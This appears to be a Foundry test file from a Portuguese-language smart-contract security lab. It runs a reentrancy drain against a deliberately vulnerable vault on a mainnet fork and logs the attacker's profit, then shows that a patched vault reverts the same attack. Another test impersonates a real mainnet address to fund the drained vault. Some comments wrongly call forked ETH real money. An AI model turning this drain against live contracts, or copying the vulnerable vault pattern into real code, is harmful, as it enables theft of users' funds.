// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {VaultVulneravel, VaultCorrigido} from "../../src/F1_Drenagem/VaultVulneravel.sol";
import {DrainReentrancia} from "../../src/F1_Drenagem/DrainReentrancia.sol";

/// @title F1 — "fazer um script drenar dinheiro num fork"
/// @notice Este arquivo é o marco da Fase 1. Três testes:
///
///   1. `test_drenarVaultVulneravel`  → o drain funciona, imprime o lucro
///   2. `test_vaultCorrigidoResiste`  → o mesmo ataque falha no contrato certo
///   3. `test_drenarComSaldoRealMainnet` → o MESMO drain, mas usando dinheiro
///                                      de verdade lido da mainnet no fork
///
/// O teste 3 é o que conecta tudo: o alvo tem 105.000 ETH **reais** porque
/// o fork baixou o estado histórico da mainnet. Depositamos nela, drenamos,
/// e o "lucro" sai do bolso do contrato.
contract F1Drenagem is Test {
    VaultVulneravel vault;
    VaultCorrigido vaultSeguro;
    DrainReentrancia atacante;

    address constant VITIMA = address(0xBEEF);
    address constant ALVO_MAINNET = 0x28C6c06298d514Db089934071355E5743bf21d60;

    uint256 constant DEPOSITO_VITIMA = 100 ether;

    function setUp() public {
        // ───────────────────────────────────────────────────────────────
        // O fork NÃO é obrigatório para este teste, mas deixamos ativo
        // para provar que os dois mundos coexistem: estado real da mainnet
        // + contratos que acabamos de criar.
        // ───────────────────────────────────────────────────────────────
        vm.createSelectFork("mainnet", 19_000_000);

        vault = new VaultVulneravel();
        vaultSeguro = new VaultCorrigido();
        atacante = new DrainReentrancia(vault);

        // A vítima deposita 100 ETH. Dinheiro de verdade, num contrato
        // que não existe na mainnet — mas o fork nos deixa criar.
        vm.deal(VITIMA, DEPOSITO_VITIMA);
        vm.prank(VITIMA);
        vault.deposit{value: DEPOSITO_VITIMA}();
    }

    // ══════════════════════════════════════════════════════════════════
    // 1 — O MARCO: drenar dinheiro
    // ══════════════════════════════════════════════════════════════════

    /// @notice O teste que o plano exige: "um script drena dinheiro e
    ///         imprime o resultado".
    function test_drenarVaultVulneravel() public {
        uint256 antes = address(vault).balance;
        emit log_named_uint("ETH no vault ANTES ", antes);

        // O atacante precisa de capital de giro. 50 ETH: o suficiente para
        // dar 2 voltas e esvaziar os 100 ETH da vítima.
        uint256 capitalDeGiro = 50 ether;
        vm.deal(address(atacante), capitalDeGiro);

        uint256 lucroAntes = address(atacante).balance;
        uint256 saldoApos = vault.saldoDe(address(atacante));

        atacante.atacar(capitalDeGiro);

        uint256 depois = address(vault).balance;
        uint256 lucro = address(atacante).balance - lucroAntes;

        // ── o print ───────────────────────────────────────────────────
        console.log("");
        console.log("==================================================");
        console.log("            DRAIN CONCLUIDO");
        console.log("==================================================");
        console.log("  voltas da reentrancia  :", atacante.voltas());
        console.log("  ETH no vault  antes    :", antes);
        console.log("  ETH no vault  depois   :", depois);
        console.log("  ETH drenado            :", antes - depois);
        console.log("  LUCRO do atacante      :", lucro);
        console.log("  ETH que sobrou no vault:", depois);
        console.log("");

        // ── as asserções ──────────────────────────────────────────────
        // O vault perdeu dinheiro...
        assertLt(depois, antes, "vault deveria ter perdido ETH");
        // ...o atacante lucrou...
        assertGt(lucro, 0, "atacante deveria ter lucrado");
        // ...e o alvo original foi sugado por inteiro.
        assertEq(depois, 0, "vault deveria estar vazio");
        assertEq(lucro, DEPOSITO_VITIMA, "lucro deveria ser exatamente os 100 ETH da vitima");
        // O registro de saldo do atacante também ficou limpo — e é por isso
        // que a vítima não consegue sacar depois: o "saldo" dela sumiu junto.
        assertEq(saldoApos, 0);
        assertGt(atacante.voltas(), 1, "reentrancia deveria ter dado mais de 1 volta");
    }

    // ══════════════════════════════════════════════════════════════════
    // 2 — O CONTROLE: o patch resolve
    // ══════════════════════════════════════════════════════════════════

    /// @notice Roda o MESMO ataque contra o VaultCorrigido e mostra que ele
    ///         não funciona. Todo relatório de bug sério tem essa metade:
    ///         não basta provar que quebra, tem que provar que o fix fecha.
    function test_vaultCorrigidoResiste() public {
        DrainReentrancia atacanteSeguro =
            new DrainReentrancia(VaultVulneravel(payable(address(vaultSeguro))));

        vm.deal(VITIMA, DEPOSITO_VITIMA);
        vm.prank(VITIMA);
        vaultSeguro.deposit{value: DEPOSITO_VITIMA}();

        vm.deal(address(atacanteSeguro), 50 ether);

        uint256 antes = address(vaultSeguro).balance;

        // O contrato corrigido deve REVERTER. `expectRevert` afirma isso.
        vm.expectRevert();
        atacanteSeguro.atacar(50 ether);

        assertEq(address(vaultSeguro).balance, antes, "saldo nao pode mudar");
        console.log("VaultCorrigido: ataque revertou. Saldo intacto:", antes);
    }

    // ══════════════════════════════════════════════════════════════════
    // 3 — O BRIDGE: dinheiro real da mainnet
    // ══════════════════════════════════════════════════════════════════

    /// @notice Demonstra que o dinheiro do fork é dinheiro de verdade:
    ///         lemos o saldo de um endereço real da mainnet, colocamos
    ///         no vault, e drenamos. Nada aqui é `vm.deal` na victims
    ///         — é transferência de ETH que existe no bloco 19.000.000.
    function test_drenarComSaldoRealMainnet() public {
        // Prova: este endereço tem saldo no estado histórico da mainnet.
        uint256 saldoReal = ALVO_MAINNET.balance;
        assertGt(saldoReal, 100_000 ether, "alvo mainnet deveria ter >100k ETH no bloco 19M");
        console.log("Saldo real do alvo mainnet:", saldoReal);

        // Agora um vault novo, alimentado com ETH vindo desse endereço.
        VaultVulneravel vaultReal = new VaultVulneravel();
        DrainReentrancia drainReal = new DrainReentrancia(vaultReal);

        // vm.prank faz o PRÓXIMO call externo sair da conta de outra pessoa.
        vm.prank(ALVO_MAINNET);
        (bool ok,) = address(vaultReal).call{value: 100 ether}("");
        // A mainnet tem balanceOf/registro, mas este vault não exige nada:
        // qualquer ETH enviado conta como depósito. (É um lab, não um dApp.)
        assertTrue(ok, "deveria conseguir depositar");
        assertEq(address(vaultReal).balance, 100 ether);

        // O atacante drena esses 100 ETH que vieram da mainnet.
        vm.deal(address(drainReal), 50 ether);
        drainReal.atacar(50 ether);

        // O atacante pôs 50 ETH de capital de giro e recebeu 50 + 100
        // (o 50 recycled + os 100 que sacou da mainnet). Lucro = 100.
        console.log("Drenado de saldo real da mainnet: 100 ETH");
        assertEq(address(vaultReal).balance, 0, "vault real deveria estar vazio");
        assertEq(address(drainReal).balance, 150 ether, "50 de capital + 100 drenados");
        assertEq(address(drainReal).balance - 50 ether, 100 ether, "lucro liquido = 100 ETH");
    }
}
